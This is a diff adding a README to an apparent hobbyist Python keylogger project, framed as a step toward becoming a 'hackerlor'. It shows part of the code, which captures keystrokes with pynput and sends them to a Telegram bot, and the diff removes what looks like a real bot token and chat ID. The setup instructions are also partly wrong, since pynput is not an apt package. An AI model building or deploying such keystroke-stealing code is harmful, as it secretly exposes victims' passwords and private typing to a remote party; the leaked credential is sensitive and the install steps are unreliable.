@@ -1,3 +1,35 @@
+# Introducetion
+This is a keylogger using python, small example for the journey to become a hackerlor.
+
+# Dependencies
+* **pynput**
+```bash
+sudo apt install pynput
+```
+# Configuration
+* **TOKEN**: Your bot token obtained from BotFather.
+* **CHAT_ID**: Your chat ID where the bot will send messages.
+
+## Explanation
+- **Configuration Section**: Clearly state that users need to set up some configuration variables before running the program.
+- **Description of TOKEN and CHAT_ID**: Provide a clear explanation of the purpose and origin of each variable to help users better understand how the program works.
+- **Security Note:**: Remind users to keep these values secure to prevent misuse.
+
+# Usage
+```bash
+python3 keylogger.py
+```
+
+# Review
+## Typing
+![alt text](image.png)
+## Get
+![alt text](image-1.png)
+## View
+![alt text](image-2.png)
+
+# Code
+```python
 from pynput.keyboard import Listener
 from telegram import Bot
 import asyncio
@@ -6,8 +38,8 @@ import os
 import http.client
 import time
 
-TOKEN = '7374133362:AAF6ExxBe8us4vy3C9YxrnGpHCFhIw8Oo74'
-CHAT_ID = '921713441'
+TOKEN = 'your_token'
+CHAT_ID = 'your_chat_id'
 
 bot = Bot(token=TOKEN)
 
@@ -70,3 +102,4 @@ def on_press(key):
 
 with Listener(on_press=on_press) as listener:
     listener.join()
+```
